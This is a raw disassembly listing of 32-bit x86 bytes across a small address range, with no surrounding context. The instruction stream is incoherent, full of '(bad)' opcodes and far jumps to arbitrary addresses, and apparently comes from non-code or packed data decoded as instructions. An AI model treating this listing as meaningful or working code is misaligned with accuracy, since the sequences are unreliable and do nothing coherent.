  427a45:	es pop ebp
  427a47:	mov    bh,0x1f
  427a49:	push   edx
  427a4a:	mov    esp,0x14dc531e
  427a4f:	popf   
  427a50:	mov    bl,0x90
  427a52:	mov    eax,edi
  427a54:	push   es
  427a55:	pushf  
  427a56:	or     BYTE PTR [ebx],dl
  427a58:	mov    al,ds:0x152c1410
  427a5d:	bswap  esi
  427a5f:	div    ah
  427a61:	push   ecx
  427a63:	cmp    esp,DWORD PTR [esi+0x5c8ecc58]
  427a69:	jbe    0x4279f8
  427a6b:	jp     0x427a94
  427a6d:	iret   
  427a6e:	(bad)  [eax]
  427a70:	inc    esi
  427a71:	call   0xaacb:0xbb816abf
  427a78:	mov    ds:0x367d85cb,al
  427a7d:	xor    al,0xd4
  427a7f:	push   ebx
  427a80:	or     al,0x4d
  427a82:	mov    ch,0x22
  427a84:	mov    esi,0x2d97a469
  427a89:	or     ah,cl
  427a8b:	sbb    ch,BYTE PTR [esi+0x6d]
  427a8e:	cmc    
  427a8f:	test   DWORD PTR [ebp-0x676fc316],esi
  427a95:	jp     0x427b04
  427a97:	mov    bh,0xab
  427a99:	dec    bl
  427a9b:	cdq    
  427a9c:	stos   BYTE PTR es:[edi],al
  427a9d:	cs xchg ebp,eax
  427a9f:	inc    esp
  427aa0:	adc    ecx,DWORD PTR [esi]
  427aa2:	adc    eax,0xbb901f3e
  427aa7:	cmp    dl,BYTE PTR [esi-0x47]
  427aaa:	sub    al,0x98
  427aac:	gs loope 0x427a71
  427aaf:	xor    edx,edi
  427ab1:	dec    ecx
  427ab2:	dec    edx
  427ab3:	fs test esp,edx
  427ab6:	jp     0x427ac6
  427ab8:	fs arpl bx,sp
  427abb:	mov    ebp,0x9e2f3f89
  427ac0:	fmul   QWORD PTR ds:0xfb6a2e89
  427ac6:	out    dx,eax
  427ac7:	xor    ah,BYTE PTR [ecx+0x14]
  427aca:	repz and DWORD PTR [ebp-0x7],0xda8096e2
  427ad2:	test   eax,0x3cd53330
  427ad7:	mov    DWORD PTR [ebx+0x44b13cc0],ecx
  427add:	dec    eax
  427ade:	xchg   esi,eax
  427adf:	dec    eax
  427ae0:	call   0x71c4ceee
  427ae5:	adc    al,0xca
  427ae7:	jg     0x427a77
  427ae9:	push   ds
  427aea:	ins    BYTE PTR es:[edi],dx
  427aeb:	addr16 dec edx
  427aed:	cwde   
  427aee:	in     eax,dx
  427aef:	lea    ebp,[edx+0x2]
  427af2:	popf   
  427af3:	rcl    DWORD PTR [edx],0x10
  427af6:	ds adc eax,0x6782ae7d
  427afc:	call   0x55efb5aa
  427b01:	lea    ebp,[edi+0x629e969b]
  427b07:	scas   al,BYTE PTR es:[edi]
  427b08:	xchg   ebx,eax
  427b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b0a:	xor    eax,0x3ce06ed2
  427b0f:	add    cl,0x0
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	mul    BYTE PTR [edx]
  427b81:	and    eax,0xa8fb46e8
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0xec000001
  427b8d:	fs sub al,0xbd
  427b90:	add    al,0xc5
  427b92:	outs   dx,DWORD PTR ds:[esi]
  427b93:	fs loopne 0x427bc9
  427b96:	jbe    0x427b1e
  427b98:	out    0x5c,eax
  427b9a:	pop    es
  427b9b:	push   esp
  427b9c:	in     eax,dx
  427b9d:	mov    bh,0xe7
  427b9f:	pop    esp
  427ba0:	mov    dl,0xba
  427ba2:	pop    eax
  427ba3:	jnp    0x427ba7
  427ba5:	mov    eax,ds:0x6307db45
  427baa:	ret    
  427bab:	inc    esi
  427bac:	or     eax,0x56319cb6
  427bb1:	lods   al,BYTE PTR ds:[esi]
  427bb2:	add    BYTE PTR ds:[esi],bh
  427bb5:	mov    eax,ds:0x3b73875c
  427bba:	sbb    eax,DWORD PTR [eax+0x2c]
  427bbd:	leave  
  427bbe:	fwait
  427bbf:	icebp  
  427bc0:	adc    esi,ecx
  427bc2:	sbb    eax,0xab06f290
  427bc7:	fist   DWORD PTR [eax+ebx*1]
  427bca:	inc    ebx
  427bcb:	test   al,0x55
  427bcd:	mov    edi,DWORD PTR [edx+esi*1-0xe]
  427bd1:	jl     0x427bf5
  427bd3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  427bd5:	or     edi,DWORD PTR [esi+0x6815c0e4]
  427bdb:	add    eax,0x533a6eff
  427be0:	cmp    bh,dl
  427be2:	(bad)  [eax+0x5e637515]
  427be8:	popa   
  427be9:	cs popa 
  427beb:	fld    QWORD PTR [ebp-0x4e]
  427bee:	push   0xffffff82
  427bf0:	mov    eax,ds:0x9b15b7dc
  427bf5:	leave  
  427bf6:	fdiv   st(4),st
  427bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bf9:	imul   esi,DWORD PTR ds:0x642aa041,0x25
  427c00:	mov    ebx,0xbc70e03f
  427c05:	add    eax,0xbfc35e7c
  427c0a:	ins    BYTE PTR es:[edi],dx
  427c0b:	xlat   BYTE PTR ds:[ebx]
  427c0c:	(bad)  
  427c0d:	fisub  DWORD PTR [ebx+0x8]
  427c10:	or     BYTE PTR [eax+0x59],dl
  427c13:	cmc    
  427c14:	xchg   ecx,eax
  427c15:	ror    BYTE PTR [esi+0x3bbfa6f6],cl
  427c1b:	pop    es
  427c1c:	jo     0x427bf1
  427c1e:	sbb    eax,0x70da65b1
  427c23:	and    ebp,DWORD PTR [esi]
  427c25:	ds add al,0xff
  427c28:	retf   0x448a
  427c2b:	aas    
  427c2c:	sbb    al,0x2d
  427c2e:	mov    eax,ds:0xc6ad740f
  427c33:	adc    al,BYTE PTR [edi-0x37]
  427c36:	loopne 0x427bfd
  427c38:	int3   
  427c39:	in     eax,0xe9
  427c3b:	pop    ebx
  427c3c:	and    dl,dh
  427c3e:	sub    al,0x91
  427c40:	push   esi
  427c41:	cmovs  ebx,ebp
  427c44:	dec    ax
  427c46:	xchg   ebp,eax
  427c47:	test   eax,0x29d3f635
  427c4c:	pop    es
  427c4d:	mov    DWORD PTR [edi],edx
  427c4f:	jl     0x427c37
  427c51:	push   ss
  427c52:	jmp    0x427cd2
  427c54:	scas   al,BYTE PTR es:[edi]
  427c55:	sub    eax,0x8751046e
  427c5a:	lahf   
  427c5b:	mov    ebp,0xd07720af
  427c60:	and    eax,0x74e26672
  427c65:	cmp    eax,0x4e35ac8
  427c6a:	popa   
  427c6b:	inc    esi
  427c6c:	mov    cl,0x1e
  427c6e:	sbb    cl,cl
  427c70:	push   cs
  427c71:	push   0xfffffff0
  427c73:	mov    ecx,esi
  427c75:	ins    DWORD PTR es:[edi],dx
  427c76:	std    
  427c77:	mov    edx,0x3a3e342
  427c7c:	lods   al,BYTE PTR ds:[esi]
  427c7d:	mov    dh,0x7
  427c7f:	push   0x65fc42d3
  427c84:	mov    bh,0x13
  427c86:	mov    WORD PTR [ecx+ebx*4+0x28],es
  427c8a:	rcl    DWORD PTR [ecx],0x11
  427c8d:	inc    ebx
  427c8e:	(bad)  
  427c8f:	dec    edi
  427c90:	adc    al,BYTE PTR [eax]
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xb7385d44,ebx
  427d02:	scas   eax,DWORD PTR es:[edi]
  427d03:	add    BYTE PTR [bp+si+0x1],ch
  427d08:	add    eax,0xc5000001
  427d0d:	ds repnz pop ecx
  427d10:	or     al,0x45
  427d12:	dec    edi
  427d13:	je     0x427d0f
  427d15:	sti    
  427d16:	rcl    DWORD PTR [ebx],cl
  427d18:	lods   eax,DWORD PTR ds:[esi]
  427d19:	jne    0x427c9d
  427d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d1c:	pop    ebx
  427d1d:	inc    esi
  427d1e:	in     eax,0x99
  427d20:	push   0x85f1f7aa
  427d25:	inc    esi
  427d26:	or     esi,DWORD PTR [edi+ebp*2+0x20c21758]
  427d2d:	daa    
  427d2e:	or     ah,BYTE PTR [esp+esi*8+0x25c1d920]
  427d35:	adc    BYTE PTR [eax-0x1],cl
  427d38:	mov    ebx,0x27b5ac98
  427d3d:	pusha  
  427d3e:	(bad)  
  427d3f:	cmp    DWORD PTR [edi],ebp
  427d41:	jnp    0x427d4e
  427d43:	push   esp
  427d44:	ror    DWORD PTR [edx],cl
  427d46:	je     0x427d7b
  427d48:	xchg   dh,dl
  427d4a:	xchg   edi,eax
  427d4b:	xchg   ebp,eax
  427d4c:	inc    edi
  427d4d:	xchg   ebp,eax
  427d4e:	mov    esp,0xdc803274
  427d53:	mov    esi,0x40af78a1
  427d58:	fcomp  QWORD PTR [esi-0x45a6a3e8]
  427d5e:	and    eax,0x33c981b4
  427d63:	stc    
  427d64:	pushf  
  427d65:	jg     0x427db8
  427d67:	xchg   ecx,eax
  427d68:	stos   BYTE PTR es:[edi],al
  427d69:	je     0x427dd8
  427d6b:	test   BYTE PTR [edx],ah
  427d6d:	jle    0x427dea
  427d6f:	test   eax,0xac512fd4
  427d74:	dec    edx
  427d75:	mov    eax,ds:0x773eeee7
  427d7a:	outs   dx,DWORD PTR ds:[esi]
  427d7b:	aaa    
  427d7c:	xor    al,0xee
  427d7e:	fldenv fs:[ebp+edi*4-0x5d5467fd]
  427d86:	push   esi
  427d87:	push   0x7b828698
  427d8c:	je     0x427dab
  427d8e:	aad    0x48
  427d90:	or     eax,0x1b393661
  427d95:	into   
  427d96:	adc    BYTE PTR [ebp+0x4a],dl
  427d99:	push   ebx
  427d9a:	paddd  mm5,QWORD PTR [eax-0x76a204b5]
  427da1:	mov    edx,0x9d9ed1f8
  427da6:	out    dx,al
  427da7:	adc    ecx,DWORD PTR [esi]
  427da9:	sti    
  427daa:	addr16 adc al,0x44
  427dad:	jp     0x427de3
  427daf:	imul   esp,DWORD PTR [esi-0x1c81b3e1],0xffffffa0
  427db6:	sbb    bl,BYTE PTR [edx-0x67]
  427db9:	mov    eax,ds:0x3b3987d6
  427dbe:	addr16 dec esi
  427dc0:	popa   
  427dc1:	repnz or ebx,DWORD PTR [edx]
  427dc4:	mov    bl,0xb2
  427dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dc7:	stos   DWORD PTR es:[edi],eax
  427dc8:	test   DWORD PTR [ebp+0x5d6b66e6],edx
  427dce:	or     bh,bh
  427dd0:	popa   
  427dd1:	and    edi,DWORD PTR fs:[eax+0x6eb7631b]
  427dd8:	xor    bh,BYTE PTR [ebx+0x170002cb]
  427dde:	std    
  427ddf:	sbb    bl,BYTE PTR [esi-0x77295c70]
  427de5:	xor    eax,0xbc78f6f5
  427dea:	xchg   edi,eax
  427deb:	ja     0x427d80
  427ded:	mov    esp,DWORD PTR [ebp+0x3c]
  427df0:	sti    
  427df1:	hlt    
  427df2:	mov    ebx,DWORD PTR [ebx+eiz*2+0x1c]
  427df6:	call   FWORD PTR [ebp-0x390712ad]
  427dfc:	(bad)  
  427dfd:	push   ds
  427dfe:	icebp  
  427dff:	lods   al,BYTE PTR ds:[esi]
  427e00:	add    BYTE PTR [ebx+0x1ed323f],0xaf
  427e07:	sar    BYTE PTR ds:0xeef1b1c,0xc3
  427e0e:	adc    DWORD PTR [ecx+0xa5],edi
	...
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	das    
  427e81:	inc    edi
  427e82:	push   edi
  427e83:	add    DWORD PTR ds:0x50001ab,eax
  427e89:	add    DWORD PTR [eax],eax
  427e8b:	add    BYTE PTR [edx],ch
  427e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e8e:	out    0xc3,al
  427e90:	sub    edx,DWORD PTR [edi-0x1f]
  427e93:	shl    DWORD PTR [ebx-0x149f81b9],cl
  427e99:	mov    bl,0x6f
  427e9b:	retf   
  427e9c:	in     eax,dx
  427e9d:	pop    edx
  427e9e:	adc    dh,0x1b
  427ea1:	mov    cs,WORD PTR [eax-0x45]
  427ea4:	mov    ecx,0x538d448c
  427ea9:	mov    ebp,0xf6cd8a82
  427eae:	adc    ebp,0x13d4b8cf
  427eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427eb5:	mov    dl,0xeb
  427eb7:	pop    ds
  427eb8:	cmp    al,0xbb
  427eba:	(bad)  
  427ebb:	addr16 je 0x427f29
  427ebe:	mov    WORD PTR [edi-0x2c],es
  427ec1:	adc    edx,0x70
  427ec4:	ret    0x9dbc
  427ec7:	dec    esi
  427ec8:	scas   al,BYTE PTR es:[edi]
  427ec9:	scas   al,BYTE PTR es:[edi]
  427eca:	(bad)  
  427ecc:	xchg   edx,eax
  427ecd:	jbe    0x427f3c
  427ecf:	cmp    DWORD PTR [esi],ebx
  427ed1:	in     eax,0x6d
  427ed3:	(bad)  
  427ed4:	push   ds
  427ed5:	nop
  427ed6:	(bad)  
  427ed7:	and    DWORD PTR [edi+ebp*8-0x52],ecx
  427edb:	pop    edi
  427edc:	pushf  
  427edd:	push   eax
  427ede:	cmp    bh,dl
  427ee0:	cmp    ecx,ecx
  427ee2:	aas    
  427ee3:	popa   
  427ee4:	pop    esi
  427ee5:	imul   dh
  427ee7:	hlt    
  427ee8:	mov    ebx,0x19106944
  427eed:	xchg   ecx,eax
  427eee:	sar    BYTE PTR [esi+0x931bbb2],1
  427ef4:	inc    esi
  427ef5:	ficom  DWORD PTR [esi+0x2179ea4a]
  427efb:	cdq    
  427efc:	inc    edx
  427efd:	mov    ah,0xc6
  427eff:	xchg   BYTE PTR [ebx+0x15],dh
  427f02:	jo     0x427ea7
  427f04:	dec    ebx
  427f05:	sahf   
  427f06:	test   al,0x5f
  427f08:	add    ebp,esp
  427f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f0b:	fcomp  st(0)
  427f0d:	mov    ecx,0xaee96aa
  427f12:	xchg   DWORD PTR [eax-0x4d],ebx
  427f15:	clc    
  427f16:	popf   
  427f17:	inc    esp
  427f18:	inc    BYTE PTR [ecx-0x16]
  427f1b:	push   ebp
  427f1c:	xchg   BYTE PTR [esi-0x48],cl
  427f1f:	dec    esi
  427f20:	inc    eax
  427f21:	and    al,0xa1
  427f23:	test   eax,0x3e35d0f8
  427f28:	stc    
  427f29:	and    BYTE PTR [ecx-0x8],al
  427f2c:	fstp   QWORD PTR [ebx+0x59ac943a]
  427f32:	adc    al,0xeb
  427f34:	push   cs
  427f35:	clc    
  427f36:	xchg   ebx,eax
  427f37:	xor    al,0x62
  427f39:	int    0x3d
  427f3b:	mov    esp,DWORD PTR [ecx-0x46]
  427f3e:	jmp    0xd3aa:0xfd4423b9
  427f45:	imul   esp,DWORD PTR [eax],0x47aa66b6
  427f4b:	repz push eax
  427f4d:	addr16 mov ecx,0xdabec511
  427f53:	clc    
  427f54:	fadd   st,st(3)
  427f56:	out    dx,eax
  427f57:	in     al,0x87
  427f59:	pop    ss
  427f5a:	lahf   
  427f5b:	mov    ch,0xaf
  427f5d:	xchg   ebp,eax
  427f5e:	add    eax,0xdd799347
  427f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f64:	(bad)  
  427f66:	(bad)  
  427f68:	sbb    al,bl
  427f6a:	jmp    0xfc62:0x33f4e6c0
  427f71:	retf   
  427f72:	add    al,0x66
  427f74:	loope  0x427fd1
  427f76:	dec    esi
  427f77:	jg     0x427f29
  427f79:	add    ecx,DWORD PTR [ecx]
  427f7b:	inc    ebp
  427f7c:	cmp    ebx,esp
  427f7e:	adc    eax,0xcb92f746
  427f83:	mov    ss,WORD PTR ds:0xb10d5f7e
  427f89:	mov    bh,0x31
  427f8b:	jp     0x427f76
  427f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f8e:	and    edi,ebp
  427f90:	loopne 0x427f92
	...
  427ff2:	add    BYTE PTR [eax],al
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	sub    BYTE PTR [ebx+ebx*4],ch
  428003:	or     ch,BYTE PTR fs:[ecx+eax*1+0x10500]
  42800b:	add    BYTE PTR [esi+0x43],ah
  42800e:	sub    al,0x23
  428010:	hlt    
  428011:	pop    eax
  428012:	inc    eax
  428013:	adc    BYTE PTR [esi],bh
  428015:	in     eax,0x91
  428017:	(bad)  [ebp-0x19517fe3]
  42801d:	jmp    0x1296:0xbe7259c5
  428024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428025:	es xor dl,BYTE PTR cs:[ebx+0x28]
  42802a:	ret    
  42802b:	pop    eax
  42802c:	adc    BYTE PTR [ebx+0x152a9d23],bl
  428032:	ror    DWORD PTR [eax+edi*8],0x63
  428036:	(bad)  
  428037:	sti    
  428038:	push   es
  428039:	psrld  mm7,QWORD PTR [eax]
  42803c:	lea    ebp,[ecx-0x38]
  42803f:	out    0xe9,eax
  428041:	push   0xffffff80
  428043:	popf   
  428044:	mov    BYTE PTR [ecx+0xe238d83],bl
  42804a:	lods   al,BYTE PTR ds:[esi]
  42804b:	ja     0x428049
  42804d:	adc    cl,BYTE PTR [edx+0x6c901c4e]
  428053:	out    dx,al
  428054:	mov    ds:0x86fdf293,al
  428059:	ins    DWORD PTR es:[edi],dx
  42805a:	jl     0x428095
  42805c:	xchg   edx,eax
  42805d:	daa    
  42805e:	push   eax
  42805f:	mov    esp,0x4582ac26
  428064:	mov    ecx,0xeefeff48
  428069:	jg     0x4280e9
  42806b:	inc    ebp
  42806c:	outs   dx,DWORD PTR ds:[esi]
  42806d:	les    ebp,FWORD PTR [ebp+edi*8+0x3acdcf1f]
  428074:	mov    al,ds:0x5443fab6
  428079:	jae    0x42802f
  42807b:	push   ebx
  42807c:	mov    al,ds:0xece1a885
  428081:	out    0xaf,eax
  428083:	and    al,dl
  428085:	mov    dh,0xd9
  428087:	hlt    
  428088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428089:	cld    
  42808a:	xor    BYTE PTR [edi],al
  42808c:	mov    ch,0xf5
  42808e:	jne    0x4280b2
  428090:	stos   DWORD PTR es:[edi],eax
  428091:	test   al,0x79
  428093:	dec    ebp
  428094:	fcom   QWORD PTR [ecx-0x6b28c2c6]
  42809a:	push   0x2afd7baf
  42809f:	cli    
  4280a0:	inc    BYTE PTR [edi-0x7a]
  4280a3:	std    
  4280a4:	(bad)  [edx-0x4b]
  4280a7:	sbb    al,0xbd
  4280a9:	pop    ecx
  4280aa:	and    ebp,eax
  4280ac:	aam    0xca
  4280ae:	fistp  WORD PTR [ebx]
  4280b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280b1:	cmp    eax,0xbca65ccb
  4280b6:	xor    BYTE PTR [esi+0x9],ch
  4280b9:	enter  0x21f,0x56
  4280bd:	inc    edx
  4280be:	aad    0xde
  4280c0:	sub    DWORD PTR [eax-0x5c7744fd],ecx
  4280c6:	(bad)  [edx+0x21da96b9]
  4280cc:	inc    edi
  4280cd:	pop    esi
  4280ce:	repnz xchg edi,eax
  4280d0:	and    ebp,ebx
  4280d2:	add    BYTE PTR [esi-0x6aba5994],0x14
  4280d9:	dec    esi
  4280da:	inc    esp
  4280db:	pop    es
  4280dc:	pusha  
  4280dd:	jmp    0x7e23:0x4a787936
  4280e4:	out    0x85,al
  4280e6:	xchg   ebp,eax
  4280e7:	jne    0x4280f5
  4280e9:	inc    ebp
  4280ea:	leave  
  4280eb:	sbb    eax,0xaafb5e97
  4280f0:	(bad)
  4280f4:	pop    esi
  4280f5:	jae    0x42807c
  4280f7:	sub    esp,DWORD PTR [edx]
  4280f9:	test   eax,edi
  4280fb:	or     cl,BYTE PTR [edx-0x4c]
  4280fe:	dec    esi
  4280ff:	add    DWORD PTR [edi-0x2a],eax
  428102:	rcr    DWORD PTR [esi-0x4de15e31],0xf9
  428109:	and    eax,0xfe878cce
  42810e:	mov    ebp,0x1b26
	...
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	mov    BYTE PTR [ecx],cl
  428182:	xor    BYTE PTR [ecx+0x1ad0f],bl
  428188:	add    eax,0xb5000001
  42818d:	out    0xb0,al
  42818f:	stos   DWORD PTR es:[edi],eax
  428190:	ins    BYTE PTR es:[edi],dx
  428191:	xor    ah,ah
  428193:	prefetcht2 BYTE PTR [ecx+eiz*8+0x2f386651]
  42819b:	add    eax,0xb7477bf9
  4281a0:	hlt    
  4281a1:	pushf  
  4281a2:	sub    bl,BYTE PTR [eax+0x7]
  4281a5:	sub    esp,ecx
  4281a7:	push   ds
  4281a8:	mov    eax,0x4e19ee07
  4281ad:	add    BYTE PTR [esi],ah
  4281af:	pop    ss
  4281b0:	mov    ecx,0x9a148d6b
  4281b5:	sahf   
  4281b6:	sub    DWORD PTR [edi+0x5c],edi
  4281b9:	pushf  
  4281ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281bb:	sub    edi,DWORD PTR [ebx+0x71]
  4281be:	out    dx,al
  4281bf:	add    DWORD PTR [eax+0x6289f89a],0x4
  4281c6:	outs   dx,DWORD PTR ds:[esi]
  4281c7:	adc    DWORD PTR [esi-0x2],ebp
  4281ca:	xlat   BYTE PTR ds:[ebx]
  4281cb:	das    
  4281cc:	sbb    al,0xcc
  4281ce:	dec    esp
  4281cf:	inc    eax
  4281d0:	enter  0xf4c7,0x64
  4281d4:	sub    edx,DWORD PTR [edx+ecx*2-0x7edaa0e7]
  4281db:	imul   edi,DWORD PTR [esi+0x60cd2453],0x4b25e6bc
  4281e5:	stc    
  4281e6:	and    BYTE PTR ds:0x1db65261,0x4e
  4281ed:	mov    DWORD PTR [esi],ebp
  4281ef:	loop   0x4281ec
  4281f1:	loope  0x42826a
  4281f3:	cmp    al,0xe8
  4281f5:	push   ss
  4281f6:	or     eax,0x5bb299d0
  4281fb:	pop    ebx
  4281fc:	and    BYTE PTR [ebp+0xcb5536e],al
  428202:	cli    
  428203:	xchg   DWORD PTR [edx+0x738730a5],ebx
  428209:	ret    0x81a3
  42820c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42820e:	mul    DWORD PTR [ebx+edx*2]
  428211:	scas   al,BYTE PTR es:[edi]
  428212:	shr    DWORD PTR [ebx],0xc1
  428215:	icebp  
  428216:	in     al,0xa5
  428218:	jnp    0x4281e6
  42821a:	push   edx
  42821b:	dec    ebx
  42821c:	sar    bl,0xa3
  42821f:	push   edi
  428220:	mov    dh,0x36
  428222:	pop    ecx
  428223:	test   bl,dh
  428225:	stc    
  428226:	dec    esi
  428227:	inc    ebp
  428228:	dec    edx
  428229:	inc    ebx
  42822a:	mov    edi,0x675d6e1f
  42822f:	into   
  428230:	jle    0x42825a
  428232:	(bad)  
  428233:	mov    ch,0x4a
  428235:	dec    eax
  428236:	mov    WORD PTR [ecx-0x5afcaa83],es
  42823c:	ret    
  42823d:	mov    ds:0xdd3b0b89,eax
  428242:	sub    BYTE PTR [eax-0x43],dl
  428245:	pop    edi
  428246:	mov    ah,0x2c
  428248:	mov    WORD PTR [esi-0x779e33fa],cs
  42824e:	push   ebx
  42824f:	add    al,0x68
  428251:	jne    0x428260
  428253:	iret   
  428254:	fld    TBYTE PTR [ebp+0x38]
  428257:	mov    eax,ds:0xf54d8b2e
  42825c:	cwde   
  42825d:	add    dl,dh
  42825f:	xor    edx,DWORD PTR [esi+0x2]
  428262:	push   ebx
  428263:	jae    0x4282de
  428265:	sub    eax,0xaf9daebb
  42826a:	adc    DWORD PTR [edx+ecx*1-0x521cfd6e],ebx
  428271:	data16 (bad) 
  428273:	sbb    ebp,ecx
  428275:	push   esp
  428276:	je     0x42823c
  428278:	push   edi
  428279:	sub    ah,BYTE PTR [edx*8-0x2325f51]
  428280:	outs   dx,DWORD PTR ds:[esi]
  428281:	mov    WORD PTR [eax+0x40c51cf9],ds
  428287:	inc    ebp
  428288:	retf   
  428289:	cmp    BYTE PTR [ebp-0x7c99feb4],bl
  42828f:	lock adc BYTE PTR [eax],al
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	nop
  428301:	ficomp DWORD PTR [ecx]
  428303:	jne    0x428319
  428305:	scas   al,BYTE PTR es:[edi]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0xbf000001
  42830d:	mov    cl,0xc2
  42830f:	repz fbld TBYTE PTR [esi]
  428312:	in     al,dx
  428313:	jno    0x428363
  428315:	outs   dx,BYTE PTR ds:[esi]
  428316:	in     al,0x6f
  428318:	cli    
  428319:	out    dx,eax
  42831a:	loopne 0x4282e5
  42831c:	inc    edi
  42831d:	mov    edx,0x1e43c8fe
  428322:	out    0x29,al
  428324:	call   0x488f:0xd1bbbcfb
  42832b:	jns    0x42838f
  42832d:	ds es stos BYTE PTR es:[edi],al
  428330:	mov    dl,0x17
  428332:	mov    ch,0xb4
  428334:	sub    dh,dh
  428336:	jp     0x428384
  428338:	and    ebx,DWORD PTR [esi-0x3c34dc4a]
  42833e:	xor    al,0xda
  428340:	or     edi,DWORD PTR [eax]
  428342:	fdivr  DWORD PTR [eax-0x154bda84]
  428348:	push   ss
  428349:	add    edx,DWORD PTR [esi]
  42834b:	pusha  
  42834c:	aad    0xd2
  42834e:	lods   al,BYTE PTR ds:[esi]
  42834f:	shl    DWORD PTR fs:[ecx],1
  428352:	push   0x3cb97875
  428357:	xchg   esp,eax
  428358:	pop    ebx
  428359:	push   ds
  42835a:	or     DWORD PTR [ebx-0x13],0xbf1dbc8b
  428361:	shl    DWORD PTR [edi+0x2],1
  428364:	mov    DWORD PTR [edi-0x34],edx
  428367:	into   
  428368:	sub    BYTE PTR gs:[esi],dl
  42836b:	mov    bl,al
  42836d:	jns    0x4283a9
  42836f:	pop    edx
  428370:	pushf  
  428371:	loope  0x428393
  428373:	hlt    
  428374:	int3   
  428375:	lods   al,BYTE PTR ds:[esi]
  428376:	pop    esp
  428377:	ja     0x428301
  428379:	mov    esp,0x98186c9c
  42837e:	jmp    0x42834f
  428380:	call   0x59394a2d
  428385:	jl     0x4283f6
  428387:	out    0x6b,eax
  428389:	mov    edi,0x849f577b
  42838e:	dec    ebp
  42838f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428390:	push   ecx
  428391:	sbb    eax,0xe278078
  428396:	ins    DWORD PTR es:[edi],dx
  428397:	mov    edi,0xfe2b5abe
  42839c:	fist   WORD PTR [ebx+ecx*8]
  42839f:	mov    dl,0x56
  4283a1:	xor    eax,0x24c4f604
  4283a6:	(bad)  
  4283a7:	cmc    
  4283a8:	fs cmp al,0xad
  4283ab:	push   eax
  4283ac:	jae    0x428335
  4283ae:	lock pavgb mm0,QWORD PTR [edx-0x67c54e63]
  4283b6:	sub    ebx,DWORD PTR [edx]
  4283b8:	push   edx
  4283b9:	add    BYTE PTR [esi+edi*8],bh
  4283bc:	mov    bl,0x70
  4283be:	sti    
  4283bf:	hlt    
  4283c0:	push   edi
  4283c1:	pop    eax
  4283c2:	ins    DWORD PTR es:[edi],dx
  4283c3:	sbb    dl,BYTE PTR ds:0x8ffa1328
  4283c9:	ret    0x6b72
  4283cc:	mov    dl,0x91
  4283ce:	rcl    DWORD PTR [ebx-0x49],cl
  4283d1:	ss in  al,0x70
  4283d4:	mov    ebx,0x2deebc27
  4283d9:	(bad)  
  4283da:	stos   DWORD PTR es:[edi],eax
  4283db:	or     eax,0x99ec21ea
  4283e0:	cli    
  4283e1:	rol    DWORD PTR [ecx-0x1dc6e2d1],1
  4283e7:	loop   0x428379
  4283e9:	xchg   DWORD PTR [edx+0x1d],edx
  4283ec:	push   cs
  4283ed:	jmp    DWORD PTR [ecx-0x6bec30aa]
  4283f3:	jmp    FWORD PTR [esi+0x54]
  4283f6:	xor    BYTE PTR [ecx+eax*2+0x15539203],cl
  4283fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283fe:	(bad)  
  4283ff:	pop    ds
  428400:	in     eax,0x98
  428402:	xor    al,0xf1
  428404:	popf   
  428405:	lds    ecx,FWORD PTR [edx]
  428407:	iret   
  428408:	mov    esp,0x71f3eeb5
  42840d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42840e:	stos   DWORD PTR es:[edi],eax
  42840f:	xor    eax,0xcb
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x21abfb32
  428481:	cdq    
  428482:	dec    esi
  428483:	jg     0x42849e
  428485:	scas   eax,DWORD PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0xeb000001
  42848d:	inc    ebp
  42848e:	fbld   TBYTE PTR [ecx]
  428490:	adc    al,0x10
  428492:	sub    eax,0x5b176c44
  428497:	push   esp
  428498:	xchg   edx,eax
  428499:	test   BYTE PTR [edx+0x16],ch
  42849c:	adc    BYTE PTR [ebp-0x4b],bh
  42849f:	test   BYTE PTR es:[edi-0x6f3286cb],al
  4284a6:	pop    eax
  4284a7:	adc    DWORD PTR ds:0xd8365ea9,0x77
